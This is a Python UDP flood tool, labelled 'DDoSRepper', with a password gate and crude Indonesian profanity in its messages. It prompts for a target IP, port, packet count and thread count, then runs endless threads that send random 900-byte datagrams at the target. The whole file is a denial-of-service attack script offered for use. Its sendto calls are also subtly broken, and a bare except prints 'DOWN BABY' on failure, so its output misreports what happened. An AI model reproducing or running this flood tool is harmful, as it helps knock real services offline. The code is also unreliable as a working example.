import random
import socket
import threading
import os,sys,time

pwd = input('Password: ')
if pwd == '6161':
  print('Sabar Kontol...')
  time.sleep(3)
  print('Udah Masuk Ni Babi')
  time.sleep(1)
  os.system("clear")
  print("""
  DDoSRepper
 

████████████████████████████████████████████████████████████████████████████
█████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
█████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█
█████████▒▒▄▀▒▒█▒▒▄▀▒▒█████████████████▒▒▄▀▒▒█▒▒▄▀▒▒█████████▒▒▄▀▒▒█████████
█████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█
█████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒█████████▒▒▄▀▒▒█████████
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
████████████████████████████████████████████████████████████████████████████""")

  p1 = str(input("IP : "))
  p2 = int(input("PORT  : "))
  p3 = int(input("PAKETS: "))
  p4 = int(input("Threads : "))
  os.system("clear")
  def titid():
      pepek = random._urandom(900)        
      while True:
          try:
              s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
              s.connect((p1,p2))
              s.sendto(pepek)
              for x in range(p3):
                  s.sendto(pepek)
              print("RITATT DEK")
          except:
              print("DOWN BABY")
  
  def titid2():
      pepek = random._urandom(900)
      while True:
          try:
              s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
              s.connect((p1,p2))
              s.sendto(pepek)
              for x in range(p3):
                  s.sendto(pepek)
              print("RITATT DEK")
          except:
              print("DOWN BABY")
  
  def titid3():
      pepek = random._urandom(900)
      while True:
          try:
              s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
              s.connect((p1,p2))
              s.sendto(pepek)
              for x in range(p3):
                  s.sendto(pepek)
              print("RITATT DEK")
          except:
              print("DOWN BABY")
              
  for y in range(p4):
      th = threading.Thread(target=titid)
      th.start()
      th = threading.Thread(target=titid2)
      th.start()
      th = threading.Thread(target=titid3)
      th.start()
else:
  print('Kasian gatau pasword nya')
  sys.exit() 
